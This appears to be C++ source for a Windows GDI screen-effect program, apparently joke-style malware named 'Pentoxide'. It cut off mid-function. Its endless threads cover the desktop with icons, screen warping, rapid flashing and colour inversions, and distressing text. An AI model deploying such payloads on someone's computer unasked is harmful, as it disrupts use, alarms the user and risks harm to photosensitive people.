#include <iostream>
#include <windows.h>
#include <windowsx.h>
#include <cmath>
#include <stdio.h>
#include <tchar.h>
#include <ShlObj.h>
#include "3DCube.h"
#include "GDIConfig.h"
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")

BOOL RefreshScreen() {
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
    InvalidateRect(0, 0, 0);
    return true;
}

int MyNewDrawIcon(int x, int y, int size, HICON hIcon) {
    HDC hdc = GetDC(0);
    DrawIconEx(hdc, x, y, hIcon, size, size, NULL, NULL, DI_NORMAL);
    ReleaseDC(0, hdc);
    DestroyIcon(hIcon); DeleteObject(hIcon);
    DeleteDC(hdc);
    Sleep(1);
    return 1;
}

DWORD WINAPI DrawIcons(LPVOID lpParam) {
    int size = 0;
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        for (int i = 0; i < 5; i++) {
            size = 32 + rand() % 118;
            HICON shifang = LoadIcon(NULL, MAKEINTRESOURCE(32512 + rand() % 4));
            MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
            Sleep(20);
        }
    }
}

DWORD WINAPI DrawCursors(LPVOID lpParam) {
    HICON shifang; int size = 0;
    srand(time(NULL));
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        shifang = LoadCursor(0, IDC_APPSTARTING); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_ARROW); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_CROSS); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_HELP); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_IBEAM); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_NO); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZEALL); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENESW); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENS); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZENWSE); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_SIZEWE); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_UPARROW); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
        shifang = LoadCursor(0, IDC_WAIT); size = 32 + rand() % 118;
        MyNewDrawIcon(rand() % w, rand() % h, size, shifang);
        Sleep(20);
    }
}

DWORD WINAPI CursorBall(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 110, angle = 0, count = 0;
    int signX = 1, signY = 1, incrementor = 1, x = 10, y = 10;
    while (true) {
        x += (incrementor * signX), y += (incrementor * signY);
        HICON hIcon = LoadIcon(0, IDI_WARNING);
        HDC hdc = GetDC(0);
        DrawIcon(hdc, x + (radius * cos(angle * 3.1415926 / 18)), y + (radius * sin(angle * 3.1415926 / 18)), hIcon);
        ReleaseDC(0, hdc);
        DestroyIcon(hIcon);
        DeleteObject(hIcon);
        DeleteDC(hdc);
        if (y >= h) { signY = -1; }
        if (x >= w) { signX = -1; }
        if (y <= 0) { signY = 1; }
        if (x <= 0) { signX = 1; }
        angle++;
        if (count == 10) {
            count = 0;
            Sleep(1);
        }
        else {
            count++;
        }
    }
}

DWORD WINAPI DrawTexts(LPVOID lpParam) {
    LPCSTR texts[12] = { "Pentoxide", ":(", "suffer", "Where am I?", "I can't breathe", "Is anyone here?", "I feel lonely and not safe", "Please let me out...", "I don't want to die", "Is this my end?", "I'm losing control", "this is not fun" }, pszFaceName = "Courier";
    while (true) {
        int xxx = rand() % 12, cWidth = 50, cHeight = 30, color1 = RGB(rand() % 255, rand() % 255, rand() % 255), color2 = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        SetTextColor(hdc, color1); SetBkColor(hdc, color2);
        HFONT font = CreateFontA(cWidth, cHeight, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, pszFaceName);
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, texts[xxx], strlen(texts[xxx]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(40);
    }
}

DWORD WINAPI BeautifulShell32Icons(LPVOID lpParam) {
    int radius = 32;
    double chushi = 1;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int numCircles = (h / (radius + 4.5)) * radius, count = 0;
        for (int i = 0; i < numCircles; i++) {
            int spiralRadius = i * chushi, x = ((w / 2) + radius) + spiralRadius * cos(i * 1.2), y = ((h / 2) + radius) + spiralRadius * sin(i * 1.2);
            HDC hdc = GetDC(0);
            HICON hIcon = ExtractIconA(0, "shell32.dll", rand() % 336);
            DrawIconEx(hdc, x, y, hIcon, 32, 32, NULL, NULL, DI_NORMAL);
            ReleaseDC(0, hdc);
            DestroyIcon(hIcon);
            if (count == 10) { count = 0; Sleep(10); }
            else { count++; }
        }
        if (chushi > 2.5) { chushi = 1; }
        else { chushi = chushi + 0.1; }
        Sleep(500);
    }
    return 0;
}

DWORD WINAPI Payload1_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                rgbquad[index].rgbRed = (i & x | i & y) + i;
                rgbquad[index].rgbGreen = (i ^ x | i + y) + i;
                rgbquad[index].rgbBlue = (i & x | i ^ y) + i;
            }
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(1); i += 2;
    }
}

DWORD WINAPI Payload2_num1(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].r = -((i * x) * (i & y) + w * xxx * 2) / 128;
            rgbScreen[i].g = ((i * x) & (i ^ x) + w * xxx * 3) / 256;
            rgbScreen[i].b = ((i * y) >> (i & y) + w * xxx * 4) / 512;
        }
        xxx++;
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc); ReleaseDC(NULL, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1);
    }
}

DWORD WINAPI Payload3_num1(LPVOID lpParam) {
    srand(time(NULL));
    int xxx = 0; BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* pBits = nullptr;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w; i++) {
            StretchBlt(hcdc, i, -2 + (rand() % 5), 1, h, hcdc, i, 0, 1, h, SRCCOPY);
        }
        for (int i = 0; i < h; i++) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x + y * w;
                double wave = sin((x + xxx) * 0.04) + cos((y + xxx) * 0.04);
                pBits[index].rgbRed += (256 * sin(wave) * 0.6);
                pBits[index].rgbGreen += (256 * cos(wave) * 0.6);
                pBits[index].rgbBlue += (256 * sin(wave) * 0.6);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 4;
    }
}

DWORD WINAPI Payload4_num1(LPVOID lpParam) {
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb ^= (rgbScreen[i].rgb + rand() % int(sqrt(i + (x ^ y) + 11))) % (rndrgb);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload5_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y, fx = ((x + (5 * i)) ^ y) + (i * 5);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h += fmod(fx / 500.f + y / h * .2f, 1.f);
                hslcolor.s = 1.f;  hslcolor.l += 0.9f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(50); i++;
    }
}

DWORD WINAPI Payload6_num1(LPVOID lpParam) {
    srand(time(NULL));
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 }; int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, cxk = cbrt((float)(rgbScreen[i].r ^ rgbScreen[i].g ^ rgbScreen[i].b));
            rgbScreen[i].r = xxx + (x + cxk);
            rgbScreen[i].g = xxx + (x + cxk);
            rgbScreen[i].b = xxx + (y + cxk);
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); xxx += 10;
    }
}

DWORD WINAPI Payload7_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (int)((x + i) ^ (y + i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 114.5 + y / static_cast<float>(h) * 1.14, 1.f);
                hslcolor.s += fmod((x % 5) / 100.f, 1.f);
                hslcolor.l += fmod((y % 10) / 200.f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int x = 0; x < w; x++) {
            StretchBlt(hcdc, x, -4 + rand() % 9, 1, h, hcdc, x, 0, 1, h, SRCCOPY);
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -4 + rand() % 9, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(10); i += 5;
    }
}

DWORD WINAPI Payload8_num1(LPVOID lpParam) {
    RGBQUAD rgbquadCopy; int i = 0;
    srand(time(NULL));
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y, fx = (int)((i ^ 2) + (i * 2) * sqrt(i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 500.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int bl = 0; bl < h; bl += 1) {
            StretchBlt(hcdc, -2 + rand() % 5, bl, w, 1, hcdc, 0, bl, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); i++;
    }
}

DWORD WINAPI Payload8_num2(LPVOID lpParam) {
    int rx = 0; double moveangle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int x = sin(moveangle) * 4, y = cos(moveangle) * 4;
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, x, y, w, h, hdc, 0, 0, SRCCOPY);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); moveangle += 3.1415926 / 10;
    }
}

DWORD WINAPI Payload9_num1(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0, blocksize = 100; RGBQUAD rgbquadCopy;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndw = 1 + rand() % (w / 2), rndh = 1 + rand() % (h / 2);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, rand() % 8, rand() % 8, w, h, hcdc, rand() % 8, rand() % 8, SRCCOPY);
        for (int x = 0; x < w; x += rndw) {
            StretchBlt(hcdc, x, -1 + rand() % 3, rndw, h, hcdc, x, 0, rndw, h, SRCCOPY);
        }
        for (int y = 0; y < h; y += rndh) {
            StretchBlt(hcdc, -1 + rand() % 3, y, w, rndh, hcdc, 0, y, w, rndh, SRCCOPY);
        }
        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-1 + rand() % 3), rndy = y + (-1 + rand() % 3);
                int rndx2 = x + (-1 + rand() % 3), rndy2 = y + (-1 + rand() % 3);
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, SRCCOPY);
            }
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (y + i * 10) ^ (x + i * 2);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 150.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); i += 2;
    }
    return 0;
}

DWORD WINAPI Payload10_num1(LPVOID lpParam) {
    int i = 0, xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor; RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = w * y + x;
                int fx = (int)(((x * xxx) | (y * xxx) | (x - xxx) ^ y));
                rgbquad[index].rgbRed = fx + i;
                rgbquad[index].rgbGreen = fx + i;
                rgbquad[index].rgbBlue = fx + i;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        Sleep(10); i++, xxx += 2;
    }
}

DWORD WINAPI Payload11_num1(LPVOID lpParam) {
    PRGBTRIPLE rgbtriple; int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x | y);
            rgbtriple[i].rgbtRed += t + x + xxx;
            rgbtriple[i].rgbtGreen += t + i + xxx;
            rgbtriple[i].rgbtBlue += t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(1); xxx += 2;
    }
    return 0;
}

DWORD WINAPI Payload12_num1(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            data[i].r *= i;  data[i].g ^= i; data[i].b &= i;
            data[i].rgb += 1145 ^ (i + ((x + xxx) ^ (y + xxx)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        Sleep(1); xxx++;
    }
    return 0;
}

DWORD WINAPI Payload13_num1(LPVOID lpParam) {
    int pi = 3.1415926, i = 10;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int x = cos(y + i * pi) * 40;
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCERASE);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCINVERT);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCPAINT);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, NOTSRCERASE);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); i += 2;
    }
}

DWORD WINAPI Payload14_num1(LPVOID lpParam) {
    double angle = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (float i = 0; i < w; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, NOTSRCCOPY);
            angle += 3.1415926 / 800;
        }
        for (float i = 0; i < h; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, NOTSRCERASE);
            angle += 3.1415926 / 800;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10);
    }
}

DWORD WINAPI Payload15_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * x + w, fx = (int)((11 ^ i) + ((11 - i) * cbrt(x - 15)) + (9 * i) + ((6 * i) * sin(y + 44)));
                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); i++;
    }
}

DWORD WINAPI Payload16_num1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = x + (i * 40);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        Sleep(10); i++;
    }
}

DWORD WINAPI Payload16_num2(LPVOID lpParam) {
    BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 50, 0 };
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
